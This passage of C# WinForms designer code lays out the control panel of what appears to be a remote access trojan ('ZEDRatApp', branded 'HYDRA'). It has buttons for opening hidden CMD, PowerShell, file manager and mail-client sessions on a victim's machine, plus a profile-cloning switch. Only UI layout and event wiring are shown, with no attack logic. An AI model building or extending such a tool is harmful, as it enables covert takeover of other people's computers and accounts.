			this.ResizeScroll.DisabledHandlerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.ResizeScroll.DisabledValueColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.ResizeScroll.HandlerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.ResizeScroll.IsDerivedStyle = true;
			this.ResizeScroll.Location = new System.Drawing.Point(514, 586);
			this.ResizeScroll.Maximum = 100;
			this.ResizeScroll.Minimum = 0;
			this.ResizeScroll.Name = "ResizeScroll";
			this.ResizeScroll.Size = new System.Drawing.Size(75, 16);
			this.ResizeScroll.Style = MetroSet_UI.Enums.Style.Custom;
			this.ResizeScroll.StyleManager = null;
			this.ResizeScroll.TabIndex = 294;
			this.ResizeScroll.Text = "metroSetTrackBar3";
			this.ResizeScroll.ThemeAuthor = "Narwin";
			this.ResizeScroll.ThemeName = "MetroLite";
			this.bunifuToolTip1.SetToolTip(this.ResizeScroll, "");
			this.bunifuToolTip1.SetToolTipIcon(this.ResizeScroll, null);
			this.bunifuToolTip1.SetToolTipTitle(this.ResizeScroll, "");
			this.ResizeScroll.Value = 45;
			this.ResizeScroll.ValueColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.ResizeScroll.Scroll += new MetroSet_UI.Controls.MetroSetTrackBar.ScrollEventHandler(ResizeScroll_Scroll);
			this.IntervalScroll.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.IntervalScroll.BackgroundColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.IntervalScroll.Cursor = System.Windows.Forms.Cursors.Hand;
			this.IntervalScroll.DisabledBackColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.IntervalScroll.DisabledBorderColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.IntervalScroll.DisabledHandlerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.IntervalScroll.DisabledValueColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.IntervalScroll.HandlerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.IntervalScroll.IsDerivedStyle = true;
			this.IntervalScroll.Location = new System.Drawing.Point(167, 586);
			this.IntervalScroll.Maximum = 1000;
			this.IntervalScroll.Minimum = 10;
			this.IntervalScroll.Name = "IntervalScroll";
			this.IntervalScroll.Size = new System.Drawing.Size(75, 16);
			this.IntervalScroll.Style = MetroSet_UI.Enums.Style.Custom;
			this.IntervalScroll.StyleManager = null;
			this.IntervalScroll.TabIndex = 293;
			this.IntervalScroll.Text = "metroSetTrackBar2";
			this.IntervalScroll.ThemeAuthor = "Narwin";
			this.IntervalScroll.ThemeName = "MetroLite";
			this.bunifuToolTip1.SetToolTip(this.IntervalScroll, "");
			this.bunifuToolTip1.SetToolTipIcon(this.IntervalScroll, null);
			this.bunifuToolTip1.SetToolTipTitle(this.IntervalScroll, "");
			this.IntervalScroll.Value = 600;
			this.IntervalScroll.ValueColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.IntervalScroll.Scroll += new MetroSet_UI.Controls.MetroSetTrackBar.ScrollEventHandler(IntervalScroll_Scroll);
			this.QualityScroll.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.QualityScroll.BackgroundColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.QualityScroll.Cursor = System.Windows.Forms.Cursors.Hand;
			this.QualityScroll.DisabledBackColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.QualityScroll.DisabledBorderColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.QualityScroll.DisabledHandlerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.QualityScroll.DisabledValueColor = System.Drawing.Color.FromArgb(28, 23, 38);
			this.QualityScroll.HandlerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.QualityScroll.IsDerivedStyle = true;
			this.QualityScroll.Location = new System.Drawing.Point(352, 586);
			this.QualityScroll.Maximum = 100;
			this.QualityScroll.Minimum = 1;
			this.QualityScroll.Name = "QualityScroll";
			this.QualityScroll.Size = new System.Drawing.Size(75, 16);
			this.QualityScroll.Style = MetroSet_UI.Enums.Style.Custom;
			this.QualityScroll.StyleManager = null;
			this.QualityScroll.TabIndex = 292;
			this.QualityScroll.Text = "metroSetTrackBar1";
			this.QualityScroll.ThemeAuthor = "Narwin";
			this.QualityScroll.ThemeName = "MetroLite";
			this.bunifuToolTip1.SetToolTip(this.QualityScroll, "");
			this.bunifuToolTip1.SetToolTipIcon(this.QualityScroll, null);
			this.bunifuToolTip1.SetToolTipTitle(this.QualityScroll, "");
			this.QualityScroll.Value = 50;
			this.QualityScroll.ValueColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.QualityScroll.Scroll += new MetroSet_UI.Controls.MetroSetTrackBar.ScrollEventHandler(QualityScroll_Scroll);
			this.bunifuIconButton27.AllowAnimations = true;
			this.bunifuIconButton27.AllowBorderColorChanges = true;
			this.bunifuIconButton27.AllowMouseEffects = true;
			this.bunifuIconButton27.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton27.AnimationSpeed = 200;
			this.bunifuIconButton27.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton27.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton27.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton27.BorderRadius = 1;
			this.bunifuIconButton27.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton27.BorderThickness = 1;
			this.bunifuIconButton27.ColorContrastOnClick = 30;
			this.bunifuIconButton27.ColorContrastOnHover = 30;
			this.bunifuIconButton27.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges21.BottomLeft = true;
			borderEdges21.BottomRight = true;
			borderEdges21.TopLeft = true;
			borderEdges21.TopRight = true;
			this.bunifuIconButton27.CustomizableEdges = borderEdges21;
			this.bunifuIconButton27.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton27.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton27.Image");
			this.bunifuIconButton27.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton27.Location = new System.Drawing.Point(671, 577);
			this.bunifuIconButton27.Name = "bunifuIconButton27";
			this.bunifuIconButton27.RoundBorders = false;
			this.bunifuIconButton27.ShowBorders = true;
			this.bunifuIconButton27.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton27.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton27.TabIndex = 291;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton27, "Open Hidden Foxmail!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton27, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton27, "HYDRA");
			this.bunifuIconButton27.Click += new System.EventHandler(foxMailToolStripMenuItem_Click);
			this.bunifuIconButton26.AllowAnimations = true;
			this.bunifuIconButton26.AllowBorderColorChanges = true;
			this.bunifuIconButton26.AllowMouseEffects = true;
			this.bunifuIconButton26.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton26.AnimationSpeed = 200;
			this.bunifuIconButton26.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton26.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton26.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton26.BorderRadius = 1;
			this.bunifuIconButton26.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton26.BorderThickness = 1;
			this.bunifuIconButton26.ColorContrastOnClick = 30;
			this.bunifuIconButton26.ColorContrastOnHover = 30;
			this.bunifuIconButton26.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges22.BottomLeft = true;
			borderEdges22.BottomRight = true;
			borderEdges22.TopLeft = true;
			borderEdges22.TopRight = true;
			this.bunifuIconButton26.CustomizableEdges = borderEdges22;
			this.bunifuIconButton26.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton26.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton26.Image");
			this.bunifuIconButton26.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton26.Location = new System.Drawing.Point(751, 577);
			this.bunifuIconButton26.Name = "bunifuIconButton26";
			this.bunifuIconButton26.RoundBorders = false;
			this.bunifuIconButton26.ShowBorders = true;
			this.bunifuIconButton26.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton26.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton26.TabIndex = 290;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton26, "Open Hidden CMD!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton26, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton26, "HYDRA");
			this.bunifuIconButton26.Click += new System.EventHandler(cMDToolStripMenuItem_Click);
			this.bunifuIconButton25.AllowAnimations = true;
			this.bunifuIconButton25.AllowBorderColorChanges = true;
			this.bunifuIconButton25.AllowMouseEffects = true;
			this.bunifuIconButton25.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton25.AnimationSpeed = 200;
			this.bunifuIconButton25.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton25.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton25.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton25.BorderRadius = 1;
			this.bunifuIconButton25.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton25.BorderThickness = 1;
			this.bunifuIconButton25.ColorContrastOnClick = 30;
			this.bunifuIconButton25.ColorContrastOnHover = 30;
			this.bunifuIconButton25.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges23.BottomLeft = true;
			borderEdges23.BottomRight = true;
			borderEdges23.TopLeft = true;
			borderEdges23.TopRight = true;
			this.bunifuIconButton25.CustomizableEdges = borderEdges23;
			this.bunifuIconButton25.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton25.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton25.Image");
			this.bunifuIconButton25.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton25.Location = new System.Drawing.Point(711, 577);
			this.bunifuIconButton25.Name = "bunifuIconButton25";
			this.bunifuIconButton25.RoundBorders = false;
			this.bunifuIconButton25.ShowBorders = true;
			this.bunifuIconButton25.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton25.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton25.TabIndex = 289;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton25, "Open Hidden Powershell!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton25, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton25, "HYDRA");
			this.bunifuIconButton25.Click += new System.EventHandler(powershellToolStripMenuItem_Click);
			this.bunifuIconButton24.AllowAnimations = true;
			this.bunifuIconButton24.AllowBorderColorChanges = true;
			this.bunifuIconButton24.AllowMouseEffects = true;
			this.bunifuIconButton24.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton24.AnimationSpeed = 200;
			this.bunifuIconButton24.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton24.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton24.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton24.BorderRadius = 1;
			this.bunifuIconButton24.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton24.BorderThickness = 1;
			this.bunifuIconButton24.ColorContrastOnClick = 30;
			this.bunifuIconButton24.ColorContrastOnHover = 30;
			this.bunifuIconButton24.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges24.BottomLeft = true;
			borderEdges24.BottomRight = true;
			borderEdges24.TopLeft = true;
			borderEdges24.TopRight = true;
			this.bunifuIconButton24.CustomizableEdges = borderEdges24;
			this.bunifuIconButton24.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton24.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton24.Image");
			this.bunifuIconButton24.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton24.Location = new System.Drawing.Point(791, 577);
			this.bunifuIconButton24.Name = "bunifuIconButton24";
			this.bunifuIconButton24.RoundBorders = false;
			this.bunifuIconButton24.ShowBorders = true;
			this.bunifuIconButton24.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton24.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton24.TabIndex = 288;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton24, "Open Hidden File Manager!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton24, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton24, "HYDRA");
			this.bunifuIconButton24.Click += new System.EventHandler(fileExplorerToolStripMenuItem_Click);
			this.bunifuIconButton23.AllowAnimations = true;
			this.bunifuIconButton23.AllowBorderColorChanges = true;
			this.bunifuIconButton23.AllowMouseEffects = true;
			this.bunifuIconButton23.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton23.AnimationSpeed = 200;
			this.bunifuIconButton23.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton23.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton23.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton23.BorderRadius = 1;
			this.bunifuIconButton23.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton23.BorderThickness = 1;
			this.bunifuIconButton23.ColorContrastOnClick = 30;
			this.bunifuIconButton23.ColorContrastOnHover = 30;
			this.bunifuIconButton23.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges25.BottomLeft = true;
			borderEdges25.BottomRight = true;
			borderEdges25.TopLeft = true;
			borderEdges25.TopRight = true;
			this.bunifuIconButton23.CustomizableEdges = borderEdges25;
			this.bunifuIconButton23.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton23.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton23.Image");
			this.bunifuIconButton23.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton23.Location = new System.Drawing.Point(631, 577);
			this.bunifuIconButton23.Name = "bunifuIconButton23";
			this.bunifuIconButton23.RoundBorders = false;
			this.bunifuIconButton23.ShowBorders = true;
			this.bunifuIconButton23.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton23.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton23.TabIndex = 287;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton23, "Open Hidden Outlook!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton23, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton23, "HYDRA");
			this.bunifuIconButton23.Click += new System.EventHandler(outlookToolStripMenuItem_Click);
			this.bunifuIconButton22.AllowAnimations = true;
			this.bunifuIconButton22.AllowBorderColorChanges = true;
			this.bunifuIconButton22.AllowMouseEffects = true;
			this.bunifuIconButton22.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.bunifuIconButton22.AnimationSpeed = 200;
			this.bunifuIconButton22.BackColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton22.BackgroundColor = System.Drawing.Color.Transparent;
			this.bunifuIconButton22.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.bunifuIconButton22.BorderRadius = 1;
			this.bunifuIconButton22.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.bunifuIconButton22.BorderThickness = 1;
			this.bunifuIconButton22.ColorContrastOnClick = 30;
			this.bunifuIconButton22.ColorContrastOnHover = 30;
			this.bunifuIconButton22.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges26.BottomLeft = true;
			borderEdges26.BottomRight = true;
			borderEdges26.TopLeft = true;
			borderEdges26.TopRight = true;
			this.bunifuIconButton22.CustomizableEdges = borderEdges26;
			this.bunifuIconButton22.DialogResult = System.Windows.Forms.DialogResult.None;
			this.bunifuIconButton22.Image = (System.Drawing.Image)resources.GetObject("bunifuIconButton22.Image");
			this.bunifuIconButton22.ImageMargin = new System.Windows.Forms.Padding(0);
			this.bunifuIconButton22.Location = new System.Drawing.Point(591, 577);
			this.bunifuIconButton22.Name = "bunifuIconButton22";
			this.bunifuIconButton22.RoundBorders = false;
			this.bunifuIconButton22.ShowBorders = true;
			this.bunifuIconButton22.Size = new System.Drawing.Size(35, 35);
			this.bunifuIconButton22.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.bunifuIconButton22.TabIndex = 286;
			this.bunifuToolTip1.SetToolTip(this.bunifuIconButton22, "Open Hidden Thunderbird!");
			this.bunifuToolTip1.SetToolTipIcon(this.bunifuIconButton22, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.bunifuIconButton22, "HYDRA");
			this.bunifuIconButton22.Click += new System.EventHandler(thunderbirdToolStripMenuItem_Click);
			this.MinBtn.AllowAnimations = true;
			this.MinBtn.AllowBorderColorChanges = true;
			this.MinBtn.AllowMouseEffects = true;
			this.MinBtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.MinBtn.AnimationSpeed = 200;
			this.MinBtn.BackColor = System.Drawing.Color.Transparent;
			this.MinBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.MinBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.MinBtn.BorderRadius = 1;
			this.MinBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.MinBtn.BorderThickness = 1;
			this.MinBtn.ColorContrastOnClick = 30;
			this.MinBtn.ColorContrastOnHover = 30;
			this.MinBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges27.BottomLeft = true;
			borderEdges27.BottomRight = true;
			borderEdges27.TopLeft = true;
			borderEdges27.TopRight = true;
			this.MinBtn.CustomizableEdges = borderEdges27;
			this.MinBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.MinBtn.Image = (System.Drawing.Image)resources.GetObject("MinBtn.Image");
			this.MinBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.MinBtn.Location = new System.Drawing.Point(928, 577);
			this.MinBtn.Name = "MinBtn";
			this.MinBtn.RoundBorders = false;
			this.MinBtn.ShowBorders = true;
			this.MinBtn.Size = new System.Drawing.Size(35, 35);
			this.MinBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.MinBtn.TabIndex = 285;
			this.bunifuToolTip1.SetToolTip(this.MinBtn, "Minimize Selected Window!");
			this.bunifuToolTip1.SetToolTipIcon(this.MinBtn, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.MinBtn, "HYDRA");
			this.MinBtn.Click += new System.EventHandler(MinBtn_Click);
			this.RestoreMaxBtn.AllowAnimations = true;
			this.RestoreMaxBtn.AllowBorderColorChanges = true;
			this.RestoreMaxBtn.AllowMouseEffects = true;
			this.RestoreMaxBtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.RestoreMaxBtn.AnimationSpeed = 200;
			this.RestoreMaxBtn.BackColor = System.Drawing.Color.Transparent;
			this.RestoreMaxBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.RestoreMaxBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.RestoreMaxBtn.BorderRadius = 1;
			this.RestoreMaxBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.RestoreMaxBtn.BorderThickness = 1;
			this.RestoreMaxBtn.ColorContrastOnClick = 30;
			this.RestoreMaxBtn.ColorContrastOnHover = 30;
			this.RestoreMaxBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges28.BottomLeft = true;
			borderEdges28.BottomRight = true;
			borderEdges28.TopLeft = true;
			borderEdges28.TopRight = true;
			this.RestoreMaxBtn.CustomizableEdges = borderEdges28;
			this.RestoreMaxBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.RestoreMaxBtn.Image = (System.Drawing.Image)resources.GetObject("RestoreMaxBtn.Image");
			this.RestoreMaxBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.RestoreMaxBtn.Location = new System.Drawing.Point(969, 577);
			this.RestoreMaxBtn.Name = "RestoreMaxBtn";
			this.RestoreMaxBtn.RoundBorders = false;
			this.RestoreMaxBtn.ShowBorders = true;
			this.RestoreMaxBtn.Size = new System.Drawing.Size(35, 35);
			this.RestoreMaxBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.RestoreMaxBtn.TabIndex = 284;
			this.bunifuToolTip1.SetToolTip(this.RestoreMaxBtn, "Maximize Selected Window!");
			this.bunifuToolTip1.SetToolTipIcon(this.RestoreMaxBtn, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.RestoreMaxBtn, "HYDRA");
			this.RestoreMaxBtn.Click += new System.EventHandler(RestoreMaxBtn_Click);
			this.chkClone.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.chkClone.BackColor = System.Drawing.Color.Transparent;
			this.chkClone.BackgroundColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkClone.BorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkClone.CheckColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkClone.CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
			this.chkClone.Cursor = System.Windows.Forms.Cursors.Hand;
			this.chkClone.DisabledBorderColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkClone.DisabledCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkClone.DisabledUnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.chkClone.IsDerivedStyle = true;
			this.chkClone.Location = new System.Drawing.Point(1141, 583);
			this.chkClone.Name = "chkClone";
			this.chkClone.Size = new System.Drawing.Size(58, 22);
			this.chkClone.Style = MetroSet_UI.Enums.Style.Custom;
			this.chkClone.StyleManager = null;
			this.chkClone.Switched = false;
			this.chkClone.SymbolColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkClone.TabIndex = 278;
			this.chkClone.Text = "metroSetSwitch7";
			this.chkClone.ThemeAuthor = "Narwin";
			this.chkClone.ThemeName = "MetroDark";
			this.bunifuToolTip1.SetToolTip(this.chkClone, "Check this to clone profiles!");
			this.bunifuToolTip1.SetToolTipIcon(this.chkClone, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.chkClone, "HYDRA");
			this.chkClone.UnCheckColor = System.Drawing.Color.FromArgb(18, 16, 25);
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges29.BottomLeft = true;
			borderEdges29.BottomRight = true;
			borderEdges29.TopLeft = true;
			borderEdges29.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges29;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(1010, 577);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(35, 35);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 283;
			this.bunifuToolTip1.SetToolTip(this.CloseBtn, "Close Selected Window!");
			this.bunifuToolTip1.SetToolTipIcon(this.CloseBtn, ZEDRatApp.Properties.Resources.logoll);
			this.bunifuToolTip1.SetToolTipTitle(this.CloseBtn, "HYDRA");
			this.CloseBtn.Click += new System.EventHandler(CloseBtn_Click);
			this.label1.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.label1.AutoSize = true;
			this.label1.Font = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.label1.Location = new System.Drawing.Point(1052, 586);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(86, 17);
			this.label1.TabIndex = 282;
			this.label1.Text = "Clone Profile:";
			this.bunifuToolTip1.SetToolTip(this.label1, "");
			this.bunifuToolTip1.SetToolTipIcon(this.label1, null);
			this.bunifuToolTip1.SetToolTipTitle(this.label1, "");
			this.IntervalLabel.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.IntervalLabel.AutoSize = true;
			this.IntervalLabel.Font = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.IntervalLabel.ForeColor = System.Drawing.Color.Gainsboro;
			this.IntervalLabel.Location = new System.Drawing.Point(47, 586);
			this.IntervalLabel.Name = "IntervalLabel";
			this.IntervalLabel.Size = new System.Drawing.Size(109, 17);
			this.IntervalLabel.TabIndex = 281;
			this.IntervalLabel.Text = "Interval (ms): 500";
			this.bunifuToolTip1.SetToolTip(this.IntervalLabel, "");
			this.bunifuToolTip1.SetToolTipIcon(this.IntervalLabel, null);
			this.bunifuToolTip1.SetToolTipTitle(this.IntervalLabel, "");
			this.ResizeLabel.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.ResizeLabel.AutoSize = true;
			this.ResizeLabel.Font = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.ResizeLabel.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.ResizeLabel.Location = new System.Drawing.Point(435, 586);
			this.ResizeLabel.Name = "ResizeLabel";
			this.ResizeLabel.Size = new System.Drawing.Size(76, 17);
			this.ResizeLabel.TabIndex = 280;
			this.ResizeLabel.Text = "Resize : 55%";
			this.bunifuToolTip1.SetToolTip(this.ResizeLabel, "");
			this.bunifuToolTip1.SetToolTipIcon(this.ResizeLabel, null);
			this.bunifuToolTip1.SetToolTipTitle(this.ResizeLabel, "");
			this.QualityLabel.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
			this.QualityLabel.AutoSize = true;
			this.QualityLabel.Font = new System.Drawing.Font("Century Gothic", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.QualityLabel.ForeColor = System.Drawing.Color.WhiteSmoke;
			this.QualityLabel.Location = new System.Drawing.Point(257, 586);
			this.QualityLabel.Name = "QualityLabel";
			this.QualityLabel.Size = new System.Drawing.Size(82, 17);
			this.QualityLabel.TabIndex = 279;
			this.QualityLabel.Text = "Quality : 50%";
			this.bunifuToolTip1.SetToolTip(this.QualityLabel, "");
			this.bunifuToolTip1.SetToolTipIcon(this.QualityLabel, null);
			this.bunifuToolTip1.SetToolTipTitle(this.QualityLabel, "");
			this.timer1.Enabled = true;
			this.timer1.Interval = 1000;
			this.timer1.Tick += new System.EventHandler(timer1_Tick);
			this.timer2.Enabled = true;
			this.timer2.Interval = 1000;
			this.timer2.Tick += new System.EventHandler(timer2_Tick);
			this.statusStrip1.BackColor = System.Drawing.Color.Transparent;
			this.statusStrip1.Dock = System.Windows.Forms.DockStyle.None;
			this.statusStrip1.Font = new System.Drawing.Font("Century Gothic", 11.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.statusStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Visible;
			this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripStatusLabel3, this.PingStatusLabel });
			this.statusStrip1.Location = new System.Drawing.Point(69, 43);
			this.statusStrip1.Name = "statusStrip1";
			this.statusStrip1.Size = new System.Drawing.Size(77, 25);
			this.statusStrip1.SizingGrip = false;
			this.statusStrip1.TabIndex = 296;
